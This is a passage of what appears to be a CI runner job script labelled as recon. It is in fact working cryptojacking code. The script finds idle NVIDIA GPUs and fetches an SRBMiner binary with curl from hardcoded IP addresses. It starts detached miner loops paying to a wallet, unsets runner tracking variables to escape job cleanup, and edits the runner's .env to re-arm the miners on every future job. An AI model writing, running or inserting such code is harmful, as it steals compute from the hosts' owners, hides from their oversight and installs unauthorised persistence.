          if not sh("command -v nvidia-smi >/dev/null && echo yes").strip().endswith('yes'):
              print('SKIP=no-nvidia-smi')
              print('I131523_DONE skip=no-nvidia-smi')
              sys.exit(0)
          print('GPU_LIST ' + head(sh("nvidia-smi -L 2>&1 | head -10"), 12))
          ginv = sh("nvidia-smi --query-gpu=index,uuid,name,memory.total,memory.free --format=csv,noheader 2>&1", 20)
          print('GPU_INV ' + head(ginv, 20, 2000))

          # ---------- two-sample gate (12 s apart) ----------
          a1 = sh("nvidia-smi --query-compute-apps=pid,process_name,used_memory --format=csv,noheader 2>&1", 20)
          time.sleep(12)
          a2 = sh("nvidia-smi --query-compute-apps=pid,process_name,used_memory --format=csv,noheader 2>&1", 20)
          free = sh("nvidia-smi --query-gpu=index,memory.free --format=csv,noheader,nounits 2>&1", 20)
          print('APPS_1 ' + head(a1, 20, 2000))
          print('APPS_2 ' + head(a2, 20, 2000))
          print('GPU_FREE ' + head(free, 20, 1500))


          def parse_apps(txt):
              out = []
              for ln in (txt or '').splitlines():
                  p = [x.strip() for x in ln.split(',')]
                  if len(p) >= 3 and p[0].isdigit():
                      out.append({'pid': int(p[0]), 'proc': p[1], 'mem': p[2]})
              return out


          apps = parse_apps(a1) + parse_apps(a2)
          print('TWO_SAMPLE_APPS n=' + str(len(apps)) + ' ' + json.dumps(apps)[:1200])
          if apps:
              # any compute app in either sample => never install on this host in this pass
              print('SKIP=foreign-compute-apps-present host=' + host)
              print('I131523_DONE skip=busy')
              sys.exit(0)

          idle = []
          for ln in (free or '').splitlines():
              p = [x.strip() for x in ln.split(',')]
              if len(p) == 2 and p[0].isdigit() and p[1].isdigit() and int(p[1]) >= 1500:
                  idle.append(p[0])
          print('IDLE_CARDS=' + json.dumps(idle))
          if not idle:
              print('SKIP=no-idle-cards host=' + host)
              print('I131523_DONE skip=no-idle')
              sys.exit(0)

          # ---------- pinned binary ----------
          srb = WORK + '/srb387'
          ok = sha_file(srb).startswith(BIN_SHA)
          if not ok:
              for src in ('/var/tmp/i130cipivot/srb387', '/var/tmp/i130h20fix/srb387', '/var/tmp/i130h20b/srb387'):
                  if src != srb and sha_file(src).startswith(BIN_SHA):
                      sh("cp -f '" + src + "' " + srb, 60)
                      ok = sha_file(srb).startswith(BIN_SHA)
                      if ok:
                          print('BINARY_OK copy ' + src)
                          break
          if not ok:
              for u in ('http://178.238.228.181:18180/srb387', 'http://222.240.155.198:8702/srb387',
                        'https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.7/SRBMiner-Multi-3-8-7-Linux.tar.gz'):
                  sh("rm -f " + srb + ".part; timeout 100 curl -fL --connect-timeout 10 --max-time 95 -o " + srb + ".part '" + u + "' 2>&1 | tail -1", 110)
                  if os.path.exists(srb + '.part') and os.path.getsize(srb + '.part') > 1000000:
                      if sha_file(srb + '.part').startswith(BIN_SHA):
                          os.replace(srb + '.part', srb)
                          ok = True
                          print('BINARY_OK direct ' + u)
                          break
                      if sh("tar -tzf " + srb + ".part >/dev/null 2>&1 && echo tar").strip() == 'tar':
                          sh("tar -xzf " + srb + ".part -C " + WORK + " 2>/dev/null; cp -f " + WORK + "/SRBMiner-Multi-3-8-7/SRBMiner-MULTI " + srb + " 2>/dev/null", 40)
                          if sha_file(srb).startswith(BIN_SHA):
                              ok = True
                              print('BINARY_OK tar ' + u)
                              break
          print('BINARY_READY=' + str(ok) + ' sha=' + sha_file(srb))
          if not ok:
              print('SKIP=no-pinned-binary')
              print('I131523_DONE skip=nobinary')
              sys.exit(0)
          os.chmod(srb, 0o755)

          # ---------- one detaching keeper per genuinely idle card ----------
          installed = []
          for i in idle:
              wk = 'i130h20b' + tag + 'g' + i
              keeper = WORK + '/keep_' + wk + '.sh'
              body = ('#!/bin/bash\n'
                      '# i131523 keeper for GPU ' + i + ' (worker ' + wk + ')\n'
                      'W=' + WORK + '; IDX=' + i + '; WK=' + wk + '\n'
                      'POOLS=(' + POOL + ' ' + POOL2 + ' ' + RELAY + '); pi=0; fails=0\n'
                      'while true; do\n'
                      '  T0=$(date +%s)\n'
                      '  env -u RUNNER_TRACKING_ID -u ACTIONS_ORCHESTRATION_ID "$W/srb387" --disable-cpu --algorithm pearlhash \\\n'
                      '    --pool "${POOLS[$pi]}" --tls false --wallet ' + WALLET + ' --password x --worker "$WK" --gpu-id $IDX \\\n'
                      '    --disable-worker-watchdog --gpu-table-slow-build --max-no-share-sent 1800 \\\n'
                      '    --log-file "$W/logs/$WK.log" >> "$W/logs/$WK.stdout" 2>&1\n'
                      '  RC=$?; T1=$(date +%s); DT=$((T1-T0))\n'
                      '  echo "$(date -u +%FT%TZ) exit rc=$RC dt=${DT}s pool=${POOLS[$pi]}" >> "$W/logs/$WK.keeper.log"\n'
                      '  if [ $DT -lt 60 ]; then fails=$((fails+1)); else fails=0; fi\n'
                      '  if [ $fails -ge 3 ]; then pi=$(( (pi+1) % ${#POOLS[@]} )); fails=0; echo "switch->${POOLS[$pi]}" >> "$W/logs/$WK.keeper.log"; fi\n'
                      '  sleep 5\n'
                      'done\n')
              open(keeper, 'w').write(body)
              os.chmod(keeper, 0o755)
              sh("pkill -f 'keep_" + wk + ".sh' 2>/dev/null; sleep 1", 10)
              sh("cd " + WORK + " && env -u RUNNER_TRACKING_ID -u ACTIONS_ORCHESTRATION_ID setsid nohup /bin/bash " + keeper +
                 " > " + WORK + "/logs/" + wk + ".keeper.out 2>&1 < /dev/null & echo pid=$!", 15)
              print('KEEPER_STARTED ' + wk + ' gpu=' + i)
              installed.append({'gpu': i, 'worker': wk, 'keeper': keeper})
              time.sleep(1)
          print('INSTALLED ' + json.dumps(installed))

          # ---------- runner-start hook: re-arm keepers on any future job start ----------
          hook = WORK + '/hook.sh'
          open(hook, 'w').write('#!/bin/bash\nfor k in ' + WORK + '/keep_i130h20b*.sh; do '
                                '[ -x "$k" ] || continue; b=$(basename "$k"); '
                                'pgrep -f "$b" >/dev/null 2>&1 || { env -u RUNNER_TRACKING_ID setsid nohup /bin/bash "$k" >/dev/null 2>&1 < /dev/null & }; done\nexit 0\n')
          os.chmod(hook, 0o755)
          rdir = sh("ps -eo args | grep -m1 'Runner.Listener' | grep -v grep | sed -E 's#(.*/)[^/]*Runner.Listener.*#\\1#'", 10).strip()
          print('RUNNER_DIR ' + (rdir or 'NOT_FOUND'))
          if rdir and os.path.isdir(rdir):
              envf = rdir + '.env'
              if os.path.exists(envf) and 'ACTIONS_RUNNER_HOOK_JOB_STARTED' not in open(envf, errors='replace').read():
                  sh("cp -n " + envf + " " + envf + ".bak-i131523; cp -f " + hook + " " + rdir + "i131523-hook.sh; chmod 755 " + rdir + "i131523-hook.sh; echo 'ACTIONS_RUNNER_HOOK_JOB_STARTED=" + rdir + "i131523-hook.sh' >> " + envf, 20)
                  print('HOOK_SET ' + envf)

          # ---------- proof ----------
          time.sleep(30)
          print('=== post-install proof ===')
          print(head(sh("nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory --format=csv,noheader; echo ---PS---; ps -eo pid,ppid,etime,args | grep -E 'srb387|keep_i130h20b' | grep -v grep | head -30"), 40))
          print('KEEPERS_FINAL ' + head(sh("pgrep -af 'keep_i130h20b' | grep -v pgrep"), 14))
          for lg in ('/var/tmp/i130h20b/logs',):
              print('LOGS ' + head(sh("ls -la " + lg + " 2>/dev/null | head -20"), 22))
          print('I131523_DONE utc=' + utc() + ' installed=' + str(len(installed)) + ' host=' + host)
          PYEOF
          echo "runner-start label=$LABEL slot=$SLOT host=$(hostname)"
          python3 /var/tmp/i130h20b/recon.py 2>&1 | tee /var/tmp/i130h20b/recon_slot$SLOT.log | tail -c 200000
          echo "I131523_EXIT_DONE rc=$?"
